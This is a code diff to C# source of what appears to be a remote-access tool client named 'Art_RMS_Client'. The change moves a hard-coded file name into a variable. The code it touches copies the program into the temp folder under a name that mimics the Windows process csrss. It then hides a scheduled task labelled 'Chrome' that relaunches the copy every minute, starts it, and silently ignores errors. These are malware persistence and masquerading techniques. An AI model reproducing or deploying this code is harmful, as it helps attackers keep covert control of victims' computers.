@@ -18,22 +18,22 @@ namespace Art_RMS_Client
             else
                 MessageBox.Show("Stub mode!");
         }
-
+        static string nameAutorunApp = @"csrss100171341.exe";
         static bool SetSettings()
         { 
-            if (Application.ExecutablePath != Path.GetTempPath() + @"csrss100171341.exe")
+            if (Application.ExecutablePath != Path.GetTempPath() + nameAutorunApp)
             {
                 try {
-                    File.Copy(Application.ExecutablePath, Path.GetTempPath() + @"csrss100171341.exe");
+                    File.Copy(Application.ExecutablePath, Path.GetTempPath() + nameAutorunApp);
                     Process.Start(new ProcessStartInfo
                     {
                         FileName = "cmd",
-                        Arguments = $@"/c SCHTASKS /Create /SC minute /TN Chrome /TR {Path.GetTempPath()}csrss100171341.exe /ST 00:00 /ET 23:59 /K /mo 1",
+                        Arguments = $@"/c SCHTASKS /Create /SC minute /TN Chrome /TR {Path.GetTempPath() + nameAutorunApp} /ST 00:00 /ET 23:59 /K /mo 1",
                         UseShellExecute = false,
                         CreateNoWindow = true,
                         RedirectStandardOutput = true
                     });
-                    Process.Start(Path.GetTempPath() + @"\csrss100171341.exe");
+                    Process.Start(Path.GetTempPath() + nameAutorunApp);
                 }
                 catch { }
                 return false;
